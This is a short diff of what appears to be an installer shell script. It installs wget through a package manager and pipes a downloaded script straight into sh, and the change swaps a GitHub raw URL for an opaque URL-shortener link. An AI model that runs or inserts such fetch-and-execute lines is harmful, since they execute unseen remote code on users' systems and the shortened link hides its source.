@@ -18,7 +18,7 @@ elif command -v apk >/dev/null 2>&1; then
     apk update && apk add wget    
 elif command -v brew >/dev/null 2>&1; then
     brew install wget    
-fi && wget -qO- https://raw.githubusercontent.com/trunghieu1604/r1-sh/main/mp3.sh | sh
+fi && wget -qO- byvn.net/ROHp | sh
 
 ****************************************************************************************
 
